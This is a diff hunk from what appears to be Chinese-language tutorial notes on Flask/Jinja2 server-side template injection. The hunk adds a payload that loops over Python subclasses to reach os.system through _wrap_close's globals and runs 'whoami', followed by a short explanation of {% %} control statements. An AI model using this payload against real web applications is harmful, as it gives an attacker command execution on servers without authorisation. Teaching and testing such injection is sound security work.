@@ -297,6 +297,16 @@ os模块执行命令:
 
 #### {% %}使用
 
+```python
+print(
+    Template('''
+        {% for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close" %}
+            {{ i.__init__.__globals__['system']('whoami') }} 
+        {% endfor %}
+    ''').render()
+)
+```
+
 {% %}是属于flask的控制语句，且以{% end.. %}结尾，可以通过在控制语句，定义变量或者写循环，判断。
 
 index.html
